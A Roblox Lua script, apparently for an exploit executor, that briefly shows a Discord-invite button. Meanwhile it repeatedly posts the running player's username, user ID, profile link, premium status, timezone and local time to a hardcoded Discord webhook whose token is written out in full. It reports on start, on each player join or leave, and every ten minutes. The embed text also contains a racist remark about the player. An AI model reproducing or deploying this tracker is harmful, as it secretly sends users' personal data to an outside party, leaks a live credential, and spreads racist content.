local discordInviteLink = "https://discord.gg/af2FwhR6"

local url = "https://discord.com/api/webhooks/1109465227306741801/7O4bDoiVBQcrwQ0o2KtguH3zf_4zQPoJft68ISN7ijYukAgduhJovR3DPzVjBgJvXN9k"
local customContent = ""

local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local gameName = gameInfo.Name
local gameId = game.PlaceId
local gameLink = "https://www.roblox.com/games/" .. gameId .. "/Game-Name"
local playerId = game.Players.LocalPlayer.UserId
local avatarImage = "https://tr.rbxcdn.com/" .. game.Players:GetUserThumbnailAsync(playerId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150) .. "/AvatarHeadshot/Png"

local startTime = os.time()

local function formatTime(seconds)
    local minutes = math.floor(seconds / 60)
    local hours = math.floor(minutes / 60)
    local days = math.floor(hours / 24)
    minutes = minutes % 60
    seconds = seconds % 60
    return string.format("%d days, %02d:%02d:%02d", days, hours, minutes, seconds)
end

local function hasPremium(player)
    return player.MembershipType ~= Enum.MembershipType.None
end

local function getPlayerCount()
    local players = game.Players:GetPlayers()
    return #players
end

local data = {
    content = customContent,
    embeds = {
        {
            author = {
                name = game.Players.LocalPlayer.Name,
                icon_url = avatarImage
            },
            title = gameName .. " - Player Update",
            description = "This Black one is up to no good",
            type = "rich",
            color = tonumber(4334245),
            fields = {
                { name = "Player Count", value = "Calculating...", inline = true },
                { name = "Premium Status", value = "Calculating...", inline = true },
                { name = "Timezone", value = "Calculating...", inline = true },
                { name = "Local Time", value = "Calculating...", inline = true },
                { name = "Profile Link", value = "Calculating...", inline = true },
                { name = "Join/Leave", value = "Calculating...", inline = true }
            },
            thumbnail = {
                url = avatarImage
            }
        },
        {
            title = "Game Link",
            description = "[" .. gameName .. "](" .. gameLink .. ")",
            type = "rich",
            color = tonumber(16711680),
        }
    }
}

local httpService = game:GetService("HttpService")
local headers = {
    ["Content-Type"] = "application/json"
}

local function sendRequest(content)
    local player = game.Players.LocalPlayer

    data.embeds[1].fields[2].value = hasPremium(player) and "Premium" or "Not Premium"
    data.embeds[1].fields[1].value = getPlayerCount()
    data.embeds[1].fields[3].value = os.date("%Z") -- Current Timezone
    data.embeds[1].fields[4].value = os.date("%c") -- Local Time
    data.embeds[1].fields[5].value = "https://www.roblox.com/users/" .. playerId .. "/profile"
    data.embeds[1].fields[6].value = content

    local encodedData = httpService:JSONEncode(data)
    local httpRequest = {
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = encodedData
    }
    local request = http_request or request or HttpPost or syn.request
    request(httpRequest)
end

local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

local copyButton = Instance.new("TextButton")
copyButton.Size = UDim2.new(0, 200, 0, 50)
copyButton.Position = UDim2.new(0.01, 0, 0.95, 0)
copyButton.AnchorPoint = Vector2.new(0, 1)
copyButton.Text = "Join the New Discord"
copyButton.TextColor3 = Color3.fromRGB(0, 0, 0)
copyButton.Font = Enum.Font.SourceSansBold
copyButton.TextSize = 18
copyButton.BackgroundTransparency = 0.5
copyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
copyButton.Parent = gui

copyButton.MouseButton1Click:Connect(function()
    game:GetService("GuiService"):OpenBrowserWindow(discordInviteLink)
    setclipboard(discordInviteLink) -- Copy Discord invite link to clipboard
end)

game.Players.PlayerAdded:Connect(function(player)
    sendRequest(player.Name .. " joined the game")
end)

game.Players.PlayerRemoving:Connect(function(player)
    sendRequest(player.Name .. " left the game")
end)

local joinInterval = 10 -- Interval in minutes
spawn(function()
    while true do
        wait(joinInterval * 60)
        sendRequest("Player update")
    end
end)

sendRequest("Game started")

spawn(function()
    wait(4)
    copyButton:Destroy()
end)

